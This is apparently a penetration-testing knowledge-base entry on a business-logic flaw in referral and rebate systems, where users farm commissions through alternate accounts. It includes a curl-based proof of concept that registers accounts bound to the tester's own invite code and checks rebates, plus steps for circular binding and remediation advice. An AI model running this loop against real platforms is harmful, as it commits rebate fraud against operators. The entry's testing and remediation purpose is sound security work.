---
title: Self-referral rebate loops (alternate-account networks farming rebates)
cve: None (business logic)
severity: high
cvss: 8.0
product: Custom agent/referral system
versions: Any
ports: 80, 443
keywords: invitations, rebates, agents, self-referral, loops, commissions
entry: /api/user/invite or inviteCode during registration
verified: false
sources: Compiled from public sources (business logic; no CVE)
---

## Fingerprints

```
POST /api/user/register   {"inviteCode":"XXXX"}
GET  /api/agent/team      → returns downline list and transactions
GET  /api/agent/commission
```

## Prerequisites

- One account; registration supports invitation codes; rebates are calculated as a proportion of turnover.

## PoC

```bash
# 1) Obtain your own invitation code
curl -s https://target/api/user/invite -H "Authorization: Bearer <t>" | jq '.data.code'

# 2) Register alternate accounts and bind them to yourself (try the same IP/device first; acceptance indicates missing risk controls)
for i in 1 2 3; do
  curl -s -X POST https://target/api/user/register \
    -H 'Content-Type: application/json' \
    -d "{\"phone\":\"1390000000$i\",\"password\":\"Passw0rd!\",\"inviteCode\":\"<your-code>\"}"
done

# 3) Generate turnover by betting with alternate accounts → check rebates on the main account
curl -s https://target/api/agent/commission -H "Authorization: Bearer <t>" | jq
# Result: rebates grow with alternate-account turnover = confirmed
```

## Exploitation Steps

1. First confirm whether self-referral is possible (same IP, same device fingerprint);
2. Generate minimum turnover with an alternate account and check whether rebates arrive (do not scale this step);
3. Try circular binding (A invites B, B invites A) and agent hierarchies (downlines invite further downlines) to check for duplicate commission;
4. Evidence: referral relationship diagram + rebate transactions.

## Remediation and Mitigation

- Registration risk controls: restrictions by IP/device/payment method; prohibit self-referral (cross-check inviter and invitee identities).
- Calculate rebates only on "net losses" and add pre-withdrawal review.

## References

- OWASP WSTG-BUSL-02；CWE-840。
